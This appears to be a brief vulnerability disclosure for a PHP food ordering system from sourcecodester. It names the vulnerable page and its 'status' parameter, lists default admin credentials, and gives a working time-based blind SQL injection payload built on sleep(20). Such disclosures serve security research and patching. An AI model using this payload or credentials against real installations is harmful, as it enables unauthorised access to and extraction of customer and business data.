# Food Ordering Management System v1.0 by oretnom23 has SQL injection
BUG_Author: YorkLee

Login account: admin/admin123 (Super Admin account)

vendors:https://www.sourcecodester.com/php/15689/food-ordering-management-system-php-and-mysql-free-source-code.html

Vulnerability File: /foms/all-orders.php

Vulnerability location: /foms/all-orders.php?status=Cancelled%20by%20Customer  // Leak place ---> status

Payload1: ?status=Cancelled by Customer'+(select*from(select(sleep(20)))a)+'






